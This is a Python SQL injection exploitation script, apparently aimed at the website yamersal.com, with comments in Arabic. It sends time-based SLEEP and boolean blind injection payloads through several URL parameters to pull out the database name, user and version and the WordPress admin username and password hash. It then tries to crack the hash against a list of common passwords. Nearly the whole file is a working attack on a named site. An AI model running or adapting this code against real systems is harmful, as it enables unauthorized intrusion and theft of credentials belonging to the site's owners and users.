#!/usr/bin/env python3
"""
Yamersal Advanced SQLi Exploiter v8.0
Time-Based & Blind SQL Injection
Author: Security Researcher
Version: 8.0 - Advanced Extraction
"""

import requests
import string
import time
import sys

class AdvancedSQLiExploiter:
    def __init__(self, target="https://yamersal.com"):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        })

    def print_status(self, message, level="INFO"):
        colors = {"INFO": "\033[94m", "SUCCESS": "\033[92m", "WARNING": "\033[93m",
                 "ERROR": "\033[91m", "CRITICAL": "\033[95m", "ADMIN": "\033[96m"}
        reset = "\033[0m"
        icons = {"INFO": "[*]", "SUCCESS": "[+]", "WARNING": "[!]", 
                "ERROR": "[-]", "CRITICAL": "[!]", "ADMIN": "[👑]"}
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def time_based_extraction(self, param="view"):
        """استخراج البيانات باستخدام Time-based SQL Injection"""
        self.print_status(f"🎯 TIME-BASED SQLI EXTRACTION - Parameter: {param}", "CRITICAL")
        
        # الحروف للإختبار
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "@._-"
        
        # البيانات للإستخراج
        extraction_targets = [
            ("database()", "Database Name"),
            ("user()", "Database User"),
            ("@@version", "MySQL Version"),
            ("(SELECT user_login FROM wp_users LIMIT 1)", "Admin Username"),
            ("(SELECT user_pass FROM wp_users LIMIT 1)", "Admin Password Hash"),
        ]
        
        for column, label in extraction_targets:
            result = self.extract_with_time(param, column, label, chars)
            if result:
                self.print_status(f"   ✅ {label}: {result}", "SUCCESS")
                
                # إذا كان هاش، حاول فكه
                if len(result) == 32 and all(c in '0123456789abcdef' for c in result.lower()):
                    password = self.crack_hash(result)
                    if password:
                        self.print_status(f"      🔓 CRACKED: {result} -> {password}", "ADMIN")

    def extract_with_time(self, param, column, label, chars):
        """استخراج قيمة باستخدام Time-based SQLi"""
        result = ""
        position = 1
        
        self.print_status(f"   🔍 Extracting: {label}", "INFO")
        
        for _ in range(100):  # حد أقصى 100 حرف
            found_char = False
            
            for char in chars:
                # بناء الـ payload باستخدام SLEEP
                if "()" in column:  # دوال مثل database(), user()
                    payload = f"' AND IF(SUBSTRING({column},{position},1)='{char}',SLEEP(3),0)--"
                else:  # استعلامات SELECT
                    payload = f"' AND IF(SUBSTRING(({column}),{position},1)='{char}',SLEEP(3),0)--"
                
                try:
                    start_time = time.time()
                    url = f"{self.target}?{param}={payload}"
                    response = self.session.get(url, timeout=5)
                    end_time = time.time()
                    
                    # إذا كان هناك تأخير 3 ثواني
                    if end_time - start_time >= 2.5:
                        result += char
                        print(f"      🎯 {label}: {result}", end="\r")
                        position += 1
                        found_char = True
                        break
                        
                except requests.exceptions.Timeout:
                    result += char
                    print(f"      🎯 {label}: {result}", end="\r")
                    position += 1
                    found_char = True
                    break
                except:
                    continue
            
            if not found_char:
                break
        
        print()  # سطر جديد بعد الانتهاء
        return result if result else None

    def crack_hash(self, hash_value):
        """فك تشفير الهاش"""
        common_passwords = [
            'admin', 'admin123', 'password', '123456', '12345678',
            '123456789', 'admin@123', 'password123', 'qwerty',
            'yamersal', 'welcome', '12345', '1234', 'test'
        ]
        
        import hashlib
        for pwd in common_passwords:
            if hashlib.md5(pwd.encode()).hexdigest() == hash_value:
                return pwd
        return None

    def blind_boolean_extraction(self, param="view"):
        """استخراج باستخدام Boolean-based Blind SQLi"""
        self.print_status(f"🎯 BOOLEAN-BASED SQLI EXTRACTION - Parameter: {param}", "CRITICAL")
        
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "@._-"
        
        # استخراج أسماء الجداول
        tables_payload = "' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)='wp_users'--"
        
        try:
            url = f"{self.target}?{param}={tables_payload}"
            response = self.session.get(url, timeout=5)
            
            if response.status_code == 200:
                # إذا كانت الاستجابة مختلفة، الجدول موجود
                self.print_status("   ✅ Found table: wp_users", "SUCCESS")
                
                # استخراج أسماء الأعمدة
                columns_payload = "' AND (SELECT column_name FROM information_schema.columns WHERE table_name='wp_users' LIMIT 0,1)='user_login'--"
                url2 = f"{self.target}?{param}={columns_payload}"
                response2 = self.session.get(url2, timeout=5)
                
                if response2.status_code == 200:
                    self.print_status("   ✅ Found columns in wp_users", "SUCCESS")
                    
        except:
            pass

    def run_advanced_exploitation(self):
        """تشغيل الاستغلال المتقدم"""
        self.print_status("🚀 STARTING ADVANCED SQL INJECTION EXPLOITATION", "CRITICAL")
        self.print_status(f"🎯 TARGET: {self.target}", "INFO")
        
        # المعلمات الضعيفة
        vulnerable_params = ['view', 'file', 'url', 'path']
        
        for param in vulnerable_params:
            self.print_status(f"\n🔓 TESTING PARAMETER: {param}", "CRITICAL")
            
            # 1. Time-based extraction
            self.time_based_extraction(param)
            
            # 2. Boolean-based extraction  
            self.blind_boolean_extraction(param)

def main():
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                   ADVANCED SQLi EXPLOITER v8.0                             ║
║               Time-Based & Blind SQL Injection Attacks                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    target = "https://yamersal.com"
    
    print(f"🎯 Target: {target}")
    print(f"💀 Using advanced SQL injection techniques")
    
    confirm = input("Continue? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled.")
        sys.exit(0)
    
    try:
        exploiter = AdvancedSQLiExploiter(target)
        exploiter.run_advanced_exploitation()
        
    except KeyboardInterrupt:
        print("\nExploitation interrupted.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()